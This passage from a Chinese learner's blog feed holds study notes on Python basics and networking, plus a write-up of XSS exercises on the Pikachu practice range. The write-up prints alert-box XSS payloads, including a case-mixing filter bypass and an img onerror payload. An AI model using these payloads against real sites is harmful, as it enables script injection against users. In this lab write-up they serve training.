class="line">print(&#x27;\t&#x27;+material)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">you order a 好好好 pizza</span><br><span class="line">好</span><br><span class="line">好个寂寞好</span><br></pre></td></tr></table></figure><h6 id="在字典中存储字典"><a href="#在字典中存储字典" class="headerlink" title="在字典中存储字典"></a>在字典中存储字典</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">users = &#123;</span><br><span class="line">&#x27;admin&#x27;: &#123;</span><br><span class="line">&#x27;first&#x27;:&#x27;ann&#x27;,</span><br><span class="line">&#x27;last&#x27;:&#x27;bbaa&#x27;,</span><br><span class="line">&#x27;location&#x27;:&#x27;A点&#x27;,</span><br><span class="line">&#125;,//&quot;,&quot;切记切记</span><br><span class="line">&#x27;adminstor&#x27;: &#123;</span><br><span class="line">&#x27;first&#x27;:&#x27;daa&#x27;,</span><br><span class="line">&#x27;last&#x27;:&#x27;ccaa&#x27;,</span><br><span class="line">&#x27;location&#x27;:&#x27;B点&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">for user_name,user_info in users.items():        //items()返回一个键值对，</span><br><span class="line">   user_name等于前面的键</span><br><span class="line">   user_info等于后面的值</span><br><span class="line">print(f&quot;username:&#123;user_name&#125;&quot;)</span><br><span class="line">print(f&quot;full name:&#123;user_info[&#x27;first&#x27;]&#125;&#123;user_info[&#x27;last&#x27;]&#125;&quot;)</span><br><span class="line">print(f&quot;location:&#123;user_info[&#x27;location&#x27;]&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username:admin</span><br><span class="line">full name:annbbaa</span><br><span class="line">location:A点</span><br><span class="line">username:adminstor</span><br><span class="line">full name:daaccaa</span><br><span class="line">location:B点</span><br></pre></td></tr></table></figure><p>这一块挺乱的我感觉，字典跟之前的if和for循环贴在一起了，再加上keys(),values(),items()等等几个方法，多练练吧0_o</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python--从入门到入土-if语句</title>
      <link href="/2025/01/08/2023%E5%B9%B43%E6%9C%8823%E6%97%A5-Python-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-if%E8%AF%AD%E5%8F%A5/"/>
      <url>/2025/01/08/2023%E5%B9%B43%E6%9C%8823%E6%97%A5-Python-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-if%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><h4 id="if语句-1"><a href="#if语句-1" class="headerlink" title="if语句"></a>if语句</h4><p>跟C语言一样，Python中的if语句也是一样的，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">names = [&#x27;琪亚娜&#x27;,&#x27;芽衣&#x27;,&#x27;布洛妮娅&#x27;,&#x27;希儿&#x27;,&#x27;德丽莎&#x27;]</span><br><span class="line">for name in names:</span><br><span class="line"></span><br><span class="line">if name == &#x27;琪亚娜&#x27;:</span><br><span class="line">print(f&#x27;&#123;name&#125;&#x27;)</span><br><span class="line">else:</span><br><span class="line">print(&#x27;没有未来的未来不是我想要的未来&#x27;)</span><br></pre></td></tr></table></figure><p>上面这个句子是定义了一个names列表，然后对列表进行循环，if在这里判断是不是‘琪亚娜’，如果是，输出名字，否则则输出‘没有未来的未来不是我想要的未来’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">琪亚娜</span><br><span class="line">没有未来的未来不是我想要的未来</span><br><span class="line">没有未来的未来不是我想要的未来</span><br><span class="line">没有未来的未来不是我想要的未来</span><br><span class="line">没有未来的未来不是我想要的未来</span><br></pre></td></tr></table></figure><p>条件测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;name = &#x27;琪亚娜&#x27;</span><br><span class="line">&gt;&gt;&gt;name == &#x27;芽衣&#x27;</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>小小的玩一波</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">car = &#x27;subaru&#x27;</span><br><span class="line">print(&quot;Is car == &#x27;subaru&#x27;?I think is true&quot;)</span><br><span class="line">print(car == &#x27;subaru&#x27;)</span><br></pre></td></tr></table></figure><p>这个东西的输出是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Is car == &#x27;subaru&#x27;?I think is true</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h4 id="if-elif-else"><a href="#if-elif-else" class="headerlink" title="if-elif-else"></a>if-elif-else</h4><p>就是正常的C中的if else else</p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">age = 19</span><br><span class="line">if age &lt; 4:</span><br><span class="line">print(&#x27;免费仔&#x27;)</span><br><span class="line">elif 4&lt;age&lt;18:</span><br><span class="line">print(&#x27;半价仔&#x27;)</span><br><span class="line">else:</span><br><span class="line">print(&#x27;全价人&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">全价人</span><br></pre></td></tr></table></figure><p>此外,if不仅仅只有==的功能，同样的它还可以判断是否在列表中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name=[&#x27;懒&#x27;,&#x27;懒1&#x27;,&#x27;懒2&#x27;,&#x27;懒3&#x27;]</span><br><span class="line">if &#x27;卷&#x27; in name:</span><br><span class="line">print(&quot;卷王&quot;)</span><br><span class="line">else:</span><br><span class="line">print(&#x27;每天光是混吃等死就已经压力很大了&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每天光是混吃等死就已经压力很大了</span><br></pre></td></tr></table></figure><p>if语句不难，而且大多数和C语言中的相似，所以这里就不赘述了</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>今日无事，勾栏听曲</title>
      <link href="/2025/01/08/2023%E5%B9%B43%E6%9C%8822%E6%97%A5-%E6%87%92/"/>
      <url>/2025/01/08/2023%E5%B9%B43%E6%9C%8822%E6%97%A5-%E6%87%92/</url>
      
        <content type="html"><![CDATA[<p>如题，今日无事，勾栏听曲</p>]]></content>
      
      
      <categories>
          
          <category> 咕咕咕 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 史诗级鸽子精 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>因为闲的没事又不想打题又不想打游戏所以就来看了会计网</title>
      <link href="/2025/01/08/2023%E5%B9%B43%E6%9C%8821%E6%97%A5-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>/2025/01/08/2023%E5%B9%B43%E6%9C%8821%E6%97%A5-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<h3 id="核心部分和边缘部分，三种交换方式"><a href="#核心部分和边缘部分，三种交换方式" class="headerlink" title="核心部分和边缘部分，三种交换方式"></a>核心部分和边缘部分，三种交换方式</h3><p>从工作方式上看，互联网可以划分为边缘部分和核心部分</p><h4 id="边缘部分："><a href="#边缘部分：" class="headerlink" title="边缘部分："></a>边缘部分：</h4><p>用户能够直接使用的，用来进行通信和资源共享</p><h4 id="核心部分："><a href="#核心部分：" class="headerlink" title="核心部分："></a>核心部分：</h4><p>有大量的网络和连接这些网络的路由器组成。这部分是为边缘部分提供服务的（提供连通性和交换）</p><h4 id="边缘部分：-1"><a href="#边缘部分：-1" class="headerlink" title="边缘部分："></a>边缘部分：</h4><p>处于互联网边缘的部分就是互联网就是互联网上的所有的主机。这些主机又被称之为端系统。边缘部分就是利用核心部分所提供的服务使得众多主机之间能够互相通信并交换或者共享信息。</p><p>互联网之间的通信：实际上是主机A上的某个进程和主机B上的某个进程之间进行通信。</p><p>在网络边缘的端系统之间的通信方式可以分为两种：C/S方式和P2P方式。</p><h4 id="C-S方式（客户-服务器方式）"><a href="#C-S方式（客户-服务器方式）" class="headerlink" title="C/S方式（客户-服务器方式）"></a>C/S方式（客户-服务器方式）</h4><p>这个是在互联网上最常见的，平时的电子邮件，页面访问都是这种方式。</p><p>这种方式中，主机A运行客户程序主动向服务器B发出服务请求，服务器B处理请求以后向主机A提供服务。</p><h4 id="P2P方式（对等连接方式）"><a href="#P2P方式（对等连接方式）" class="headerlink" title="P2P方式（对等连接方式）"></a>P2P方式（对等连接方式）</h4><p>本质上还是一种C/S，与之不同的是P2P中每一台主机即是客户又是服务器。</p><h4 id="核心部分"><a href="#核心部分" class="headerlink" title="核心部分"></a>核心部分</h4><p>在网络核心部分起特殊作用的是路由器。路由器是实现分组交换的关键构建，其任务是转发收到的分组。</p><p>为了了解分组交换，首先我们要先了解电路交换。</p><p>从通信资源的分配角度来说，交换就是通过某种方式动态的分配传输线路的资源。</p><p>比如打电话，必须先拨号建立连接，当听到交换机送来的振铃以后说明已经建立好了联系，当你结束通话后，交换机释放资源。这种“建立连接—通话—释放连接”的方式就是电路交换。电路交换的重点是在通话过程中，通话的两个用户是中占有端到端的通信资源。</p><p>分组交换则是采用存储转发技术，表示吧一个报文（要发送的一整块数据）划分为几个分组后再进行传送，而在传输的过程中，会在每一个数据段的前面加上一段控制信息组成的包头，再进行传输。</p><p><img src="https://s2.loli.net/2023/06/10/MbOLKaj34khFmQ6.jpg" alt="dab175a333e842dab0df284705b8fe40.jpg"></p><p><img src="https://img-blog.csdnimg.cn/c9ff6bb493b44699be16ce69d716170d.jpeg" alt="img"></p><p>由此可见，如果要大量传输数据，电路交换效率更高，而报文交换和分组交换相比，分组交换比报文交换的时延小，灵活性更高</p><h3 id="计算机网络的性能"><a href="#计算机网络的性能" class="headerlink" title="计算机网络的性能"></a>计算机网络的性能</h3><h5 id="1-速率"><a href="#1-速率" class="headerlink" title="1.速率"></a>1.速率</h5><p>数据的传送速率，也被称之为数据率或者比特率。计算机网络中的一个重要的性能指标。</p><h5 id="2-带宽"><a href="#2-带宽" class="headerlink" title="2.带宽"></a>2.带宽</h5><p>1）本来指的是某个信号具有的频带宽度</p><p>2）最高数据率</p><h5 id="3-吞吐量"><a href="#3-吞吐量" class="headerlink" title="3.吞吐量"></a>3.吞吐量</h5><p>单位时间内通过某个网络中某通道传达数据的能力</p><h5 id="4-时延"><a href="#4-时延" class="headerlink" title="4.时延"></a>4.时延</h5><p>数据（一个保温或分组，甚至比特）从网络（或链路）的一端</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python--从入门到入土--操作列表</title>
      <link href="/2025/01/08/2023%E5%B9%B43%E6%9C%8821%E6%97%A5-Pyhton-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E6%93%8D%E4%BD%9C%E5%88%97%E8%A1%A8/"/>
      <url>/2025/01/08/2023%E5%B9%B43%E6%9C%8821%E6%97%A5-Pyhton-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E6%93%8D%E4%BD%9C%E5%88%97%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="遍历整个列表"><a href="#遍历整个列表" class="headerlink" title="遍历整个列表"></a>遍历整个列表</h3><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">people = [&#x27;ann&#x27;,&#x27;bee&#x27;,&#x27;c++&#x27;,&#x27;dev--c&#x27;]</span><br><span class="line">for person in people:</span><br><span class="line">print(person)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ann</span><br><span class="line">bee</span><br><span class="line">c++</span><br><span class="line">dev--c</span><br></pre></td></tr></table></figure><p>需要注意的是：</p><p>Python中的for循环与C语言中的不一样，C语言中的是</p><p>for(中间是循环条件)</p><p>但Python的是for (临时变量) in （列表）</p><p>而且需要注意的是，Python每次运行循环的时候需要注意在后面添加一个:，这在C语言中是不层出现过的，C语言中，for后面不需要加任何的标点符号。</p><h5 id="在for循环中进行更多的操作，比如说"><a href="#在for循环中进行更多的操作，比如说" class="headerlink" title="在for循环中进行更多的操作，比如说"></a>在for循环中进行更多的操作，比如说</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">people = [&#x27;ann&#x27;,&#x27;bee&#x27;,&#x27;c++&#x27;,&#x27;dev--c&#x27;]</span><br><span class="line">for person in people:</span><br><span class="line">print(f“&#123;person.title()&#125;,you are a good man&quot;)</span><br><span class="line">print(f&quot;i can&#x27;t meet a better man than you,f&#123;person.title()&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Ann,you are a good man</span><br><span class="line">i can&#x27;t meet a better man than you,Ann</span><br><span class="line">Bee,you are a good man</span><br><span class="line">i can&#x27;t meet a better man than you,Bee</span><br><span class="line">C++,you are a good man</span><br><span class="line">i can&#x27;t meet a better man than you,C++</span><br><span class="line">Dev--C,you are a good man</span><br><span class="line">i can&#x27;t meet a better man than you,Dev--C</span><br></pre></td></tr></table></figure><p>在for循环中，想要包含多少行代码都是可以的，实际上，你会发现使用for循环对每个元素执行众多不同的操作很有用</p><h6 id="注意事项：（一股子翻译腔味道）"><a href="#注意事项：（一股子翻译腔味道）" class="headerlink" title="注意事项：（一股子翻译腔味道）"></a>注意事项：（一股子翻译腔味道）</h6><ol><li>注意缩进，切记注意，你永远不知道你会犯下什么样的错误直到有人指出来</li><li>注意标点符号，注意冒号，这很重要，你知道的</li></ol><h5 id="创建数值列表"><a href="#创建数值列表" class="headerlink" title="创建数值列表"></a>创建数值列表</h5><h6 id="使用函数range"><a href="#使用函数range" class="headerlink" title="使用函数range"></a>使用函数range</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for value in range(1,5):</span><br><span class="line">print(value)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>没错，range(1,5)只打印了1-4，这回死编程语言中常见的差一行为的结果，函数range（）让python从指定的第一个值开始数，并在到达你指定的第二个值时停止。这就是他不输出5的原因。当然，如果你执意要打印1-5，只需要输入range(1,6)</p><h6 id="使用range创建数值列表"><a href="#使用range创建数值列表" class="headerlink" title="使用range创建数值列表"></a>使用range创建数值列表</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;number = list(range(1,6))</span><br><span class="line">&gt;&gt;&gt;print(number)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 2, 3, 4, 5]</span><br></pre></td></tr></table></figure><p>需要注意的是，上面的list后面使用的实施（）而不是【】，如果你使用【】的话，那就是输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list[range(1, 6)]</span><br></pre></td></tr></table></figure><p>使用range时还可以指定步长，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">number = list(range(2,11,2))</span><br><span class="line">print(number)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[2, 4, 6, 8, 10]</span><br></pre></td></tr></table></figure><p>使用range（）几乎能够创建任何需要的数集。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">squares = []</span><br><span class="line">for value in range(1,11):</span><br><span class="line">square = value ** 2</span><br><span class="line">squares.append(square)</span><br><span class="line">print(squares)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span><br></pre></td></tr></table></figure><p>可以小小的进行优化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">squares = []</span><br><span class="line">for value in range(1,11):</span><br><span class="line">squares.append(square**2)</span><br><span class="line">print(squares)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span><br></pre></td></tr></table></figure><p>当然,python中也有一些库函数可以方便你运算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">digits = [1,2,3,4,5,6,7,8,9]</span><br><span class="line">print(min(digits))</span><br><span class="line">print(max(digits))</span><br><span class="line">print(sum(digits))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">9</span><br><span class="line">45</span><br></pre></td></tr></table></figure><p>值得注意的是，这里的digits不能使用for循环，原因是不能迭代</p><h6 id="列表解析"><a href="#列表解析" class="headerlink" title="列表解析"></a>列表解析</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">squares = [value**2 for value in range(1,11)]</span><br><span class="line">print(squares)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span><br></pre></td></tr></table></figure><p>这个列表中的意思是首先制定一个描述性的列表名squares，然后制定一个左方括号，并且定义一个表达式，用于生成要存储到列表中的值，接下来，编写一个for循环，用于给表达式提供值，在加上右方括号。</p><h5 id="使用列表的一部分"><a href="#使用列表的一部分" class="headerlink" title="使用列表的一部分"></a>使用列表的一部分</h5><h6 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player = [&#x27;ann&#x27;,&#x27;bee&#x27;,&#x27;c++&#x27;,&#x27;dev&#x27;]</span><br><span class="line">print(player[0:2])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;ann&#x27;, &#x27;bee&#x27;]</span><br></pre></td></tr></table></figure><p>上述语言中[:]分号是到的意思，比如说0:2是索引为0的数到索引为1的数的，[1:]是索引为1的数到末尾的，[:2]是索引为0的数到索引为2 的数</p><p>当然，如果你要输出在结尾附近的，你可以用这样的形式[-3:]</p><p>当然，列表也是可以遍历和复制的</p><h5 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h5><p>元组看起来很像列表，但其实是不一样的，元组使用的是圆括号而不是方括号</p><p>需要注意的是Python是禁止修改元组的值的</p><p>所以要想修改元组的值，只能从头重新定义一个元组。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu----xss</title>
      <link href="/2025/01/08/2023%E5%B9%B43%E6%9C%8821%E6%97%A5-pikachu-xss/"/>
      <url>/2025/01/08/2023%E5%B9%B43%E6%9C%8821%E6%97%A5-pikachu-xss/</url>
      
        <content type="html"><![CDATA[<h3 id="XSS（跨站脚本）"><a href="#XSS（跨站脚本）" class="headerlink" title="XSS（跨站脚本）"></a>XSS（跨站脚本）</h3><p>cross-site scripting，简称CSS，但是前端叠层样式表缩写也是css，所以就叫xss喽</p><p>反射型XSS</p><p>存储型XSS</p><p>DOM型XSS</p><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>一种非持久的攻击，做法是：恶意攻击者往web页面中插入恶意代码，当用户浏览这一页的时候，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的目的。这里的恶意插入的代码并没有保存在目标页面中，需要引诱用户点击一个链接到目标网站的恶意链接来实施攻击。</p><p><a href="https://blog.csdn.net/bwxzdjn/article/details/123645177">https://blog.csdn.net/bwxzdjn/article/details/123645177</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">简单来说就是</span><br><span class="line">网站上附着一个链接，这个链接是恶意攻击者的恶意链接，用户点进去以后就会进入恶意攻击者的网站，恶意攻击者就会知道用户的信息</span><br></pre></td></tr></table></figure><p><img src="https://typorazhd.oss-cn-beijing.aliyuncs.com/image-20221208143205877.png" alt="image-20221208143205877"></p><h4 id="pikuchu靶场反射型xss-get"><a href="#pikuchu靶场反射型xss-get" class="headerlink" title="pikuchu靶场反射型xss(get)"></a>pikuchu靶场反射型xss(get)</h4><p>随便输入一个’”&lt;&gt;输出结果是</p><p><img src="https://s2.loli.net/2023/03/21/elbXhvtZz8iro7k.png" alt="image-20230321135824714.png"></p><p>这能忍？反手就是一个ctrl -u</p><p>（这里我是页面自动翻译了，理论上应该是who is ‘“&lt;&gt;,i don’t care）</p><p>直接Ctrl -f搜索who is </p><p><img src="https://s2.loli.net/2023/03/21/1iwplsH72PL3qJD.png" alt="image-20230321135703131.png"></p><p>好，确定是反射型的xss(好像说了句废话的骄傲)</p><p><img src="https://s2.loli.net/2023/03/21/9DiamckuOMgP2G7.png" alt="image-20230321142115407.png"></p><p>这里看到了限制字符长度是20，弹药输入的肯定高于20个，需要在控制台中修改</p><p>打开控制台，搜索maxlength的时候无意中发现这么一个东西</p><p><img src="https://s2.loli.net/2023/03/21/LJbPXwfscC7hixF.png" alt="image-20230321142052781.png"></p><p>输进去瞅瞅</p><p><img src="https://s2.loli.net/2023/03/21/pBT5HWQKe4nJvYz.png" alt="image-20230321142240712.png"></p><p>挖趣，他真的，我哭死</p><p>但这也不能阻止我搞他</p><p>输入<script>alert(“xss”)<script>构建弹窗</p><p>很好，没有弹</p><p>问题出在<script>alert("xss")</script></p><p><img src="https://s2.loli.net/2023/03/21/5jwvFCxpzlZ8WJU.png" alt="image-20230321142623029.png"></p><p>呜呼~起飞</p><h4 id="pikuchu靶场存储型xss"><a href="#pikuchu靶场存储型xss" class="headerlink" title="pikuchu靶场存储型xss"></a>pikuchu靶场存储型xss</h4><p>据说存储型的和反射型的原理是一样的，但是存储型的是</p><p>持久性的，他会将你输入的注入到后端数据库去</p><p>存储型和反射型的差别在于我们每次去刷新页面还是会弹出这个窗口，因为我们刚才的留言已经保存在数据库里了。我们每次打开网页，都会从数据库中把这个留言加载出来，触发这个脚本的运行。</p><p>所以这道题我直接删payload了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alter(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="pikuchu靶场DOM型xss"><a href="#pikuchu靶场DOM型xss" class="headerlink" title="pikuchu靶场DOM型xss"></a>pikuchu靶场DOM型xss</h4><p>Hexo不好贴图，我就放在了有道云里面</p><h4 id="pikachu靶场盲打"><a href="#pikachu靶场盲打" class="headerlink" title="pikachu靶场盲打"></a>pikachu靶场盲打</h4><p>并不是一种xss漏洞的类型，其实说的是一种xss的攻击场景。</p><p>我直接输入<img src="https://img2020.cnblogs.com/blog/1835697/202003/1835697-20200331205008263-436500120.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>正面一无所有，所以我看了眼提示进了后台，账号admin密码123456提示里面有，进入以后就弹出了xss的通知</p><h4 id="pikachu靶场过滤"><a href="#pikachu靶场过滤" class="headerlink" title="pikachu靶场过滤"></a>pikachu靶场过滤</h4><p><img src="https://img2020.cnblogs.com/blog/1835697/202003/1835697-20200331210842442-1573747322.png" alt="img"></p><p>绕过姿势我看了几种</p><ol><li><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRiPt&gt;alert(&quot;xsS&quot;)&lt;/ScRiPt&gt;</span><br></pre></td></tr></table></figure></li><li><h5 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=alert(&quot;xss&quot;) /&gt; </span><br></pre></td></tr></table></figure></li></ol><h4 id="pikachu靶场htmlspecialchars"><a href="#pikachu靶场htmlspecialchars" class="headerlink" title="pikachu靶场htmlspecialchars"></a>pikachu靶场htmlspecialchars</h4><p><img src="https://img2020.cnblogs.com/blog/1835697/202003/1835697-20200331213849221-1479876068.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> 皮卡丘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python:从入门到入土---列表</title>
      <link href="/2025/01/08/2023%E5%B9%B43%E6%9C%8820%E6%97%A5-Pyhton-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E5%88%97%E8%A1%A8/"/>
      <url>/2025/01/08/2023%E5%B9%B43%E6%9C%8820%E6%97%A5-Pyhton-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E5%88%97%E8%A1%A8/</url>
      
